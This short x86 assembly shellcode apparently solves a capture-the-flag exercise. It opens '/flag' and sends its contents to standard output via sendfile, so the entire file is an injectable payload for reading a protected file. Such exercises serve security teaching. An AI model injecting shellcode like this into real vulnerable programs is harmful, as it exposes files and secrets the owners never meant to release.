.global _start
_start:
.intel_syntax noprefix
# open("/flag", O_RDONLY); // 0 is O_RDONLY
mov eax, 5
lea ebx, [rip+flag]
mov ecx, 0
int 0x80

# sendfile(1, 3, 0, 0x80);
mov eax, 187
mov ebx, 1
mov ecx, 3
mov edx, 0
mov esi, 0x80
int 0x80

flag:
.string "/flag"
